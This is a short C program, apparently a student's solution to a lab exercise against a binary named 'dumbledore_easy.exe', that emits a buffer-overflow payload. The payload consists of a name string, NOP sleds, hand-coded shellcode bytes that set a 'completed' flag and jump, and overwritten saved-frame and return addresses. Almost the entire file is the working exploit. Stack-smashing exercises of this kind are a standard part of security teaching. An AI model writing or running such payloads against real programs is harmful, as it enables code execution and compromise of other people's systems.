// Wright Kim
// wdk7bj
// ./dumbledore_easy.exe

#include <stdio.h>
#include <string.h>

char attackString[] = "Wright Kim";

int main(){
	int i;
	// "Wright Kim"
	char *p = attackString;
	unsigned char nop = 0x90;
	unsigned char esc = 0x82;
	unsigned char completed[] = {0xc6,0x05,0x48,0xa0,0x04,0x08,0x01};
	signed char jump[] = {0xe9,0x0e,0xe5,0xff,0xff};
	unsigned char ebp[] = {0xf8,0xef,0xff,0xbf};
	unsigned char inject[] = {0x70,0xa0,0x04,0x08};
	unsigned char name[] = {0x60,0xa0,0x04,0x08};
	// putchar from top of the stack to $ebp + 8
	// "Wright Kim"
	for(i = 0; i < sizeof(attackString); i++){
		putchar(*p);
		p++;
	}
	putchar('\0');
	for(i = 0; i < 7; i++){
		putchar(nop);
	}

	for(i = 0; i < 7; i++){
		putchar(completed[i]);
	}

	for(i = 0; i < 5; i++){
		putchar(nop);
	}

	for(i = 0; i < 5; i++){
		putchar(jump[i]);
	}

	for(i = 0; i < 84; i++){
		putchar(nop);
	}
	putchar(esc);
	
	for(i = 0; i < 5; i++){
		putchar(nop);
	}

	for(i = 0; i < 4; i++){
		putchar(ebp[i]);
	}

	for(i = 0; i < 4; i++){
		putchar(inject[i]);
	}

	for(i = 0; i < 4; i++){
		putchar(name[i]);
	}

	putchar(nop);
	putchar(nop);
	return 1;
}
